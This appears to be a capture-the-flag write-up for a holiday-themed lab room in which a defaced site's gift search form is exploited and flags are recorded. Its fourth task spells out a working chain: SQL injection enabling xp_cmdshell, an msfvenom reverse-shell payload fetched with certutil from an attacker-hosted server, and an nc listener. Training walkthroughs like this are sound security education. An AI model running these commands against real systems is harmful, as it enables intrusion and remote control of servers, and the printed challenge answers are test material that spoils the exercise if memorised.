# Inject the Halls with EXEC Queries 
## Scenario
The Best Festival Company started receiving many reports that their company website, bestfestival.thm, is displaying some concerning information about the state of Christmas this year! After looking into the matter, Santa’s Security Operations Center (SSOC) confirmed that the company website has been hijacked and ultimately defaced, causing significant reputational damage. To make matters worse, the web development team has been locked out of the web server as the user credentials have been changed. With no other way to revert the changes, Elf Exploit McRed has been tasked with attempting to hack back into the server to regain access.
1. SQL - Structured Query Language
2. PHP - Hypertext PreProcessor
![image](https://github.com/pixie-nukes/JTP23-WriteUps/assets/94845416/ed72f75e-35f1-4a97-9025-445787e05af4)
## SQL
SQL injection vulnerabilities pose a considerable risk to web applications as they can lead to unauthorised access, data theft, data manipulation, or even the complete compromise of a web application and its underlying database through remote code execution. If an attacker can control which queries the database executes, they can control the database functions performed and the data returned. As such, the impact can be catastrophic, ranging from exposing sensitive user information to causing significant data breaches.
![image](https://github.com/pixie-nukes/JTP23-WriteUps/assets/94845416/6e8ceae5-36da-4507-9721-74f447c5efeb)
## Tasks:
### 1. Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
> /giftsearch.php
### 2. Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
After Injecting a `'` on the parameter,
> ODBC Driver 17 for SQL Server
### 3. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
After Inject the code after the value of parameter `‘OR 1=1 --`
> THM{a4ffc901c27fb89efe3c31642ece4447}
### 4. What flag is in the note file Gr33dstr left behind on the system?
1. `http://THM-MACHINE-IP/giftresults.php?age='; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; --` Inject this code.
2. Creating a payload using the below command
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe`
3. Start an HTTP server to host the payload with the below command
`python3 -m http.server 8000`
4. Send the payload to the victim site using the below command
`http://THM-MACHINE-IP/giftresults.php?age='; EXEC xp_cmdshell ‘certutil -urlcache -f http://YOUR.LISTENING.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe’;--`
5. Set a listener using the below command
`nc -lnvp 4444`
6. Execute the payload using the command
`http://THM-MACHINE-IP/giftresults.php?age='; EXEC xp_cmdshell ‘C:\Windows\Temp\reverse.exe’; —`
7. Change the directory to Administrator using the command
`Cd C:\Users\Administrator`
8. View the Content of Note.txt using the below command
`type Note.txt`
![image](https://github.com/pixie-nukes/JTP23-WriteUps/assets/94845416/b6ccc650-2b5f-4071-882c-295b95e68220)
> THM{b06674fedd8dfc28ca75176d3d51409e}
### 5. What is the flag you receive on the homepage after restoring the website?
![image](https://github.com/pixie-nukes/JTP23-WriteUps/assets/94845416/e103959d-47ca-4121-ae26-db2a217c7ce4)
>THM{4cbc043631e322450bc55b42c}
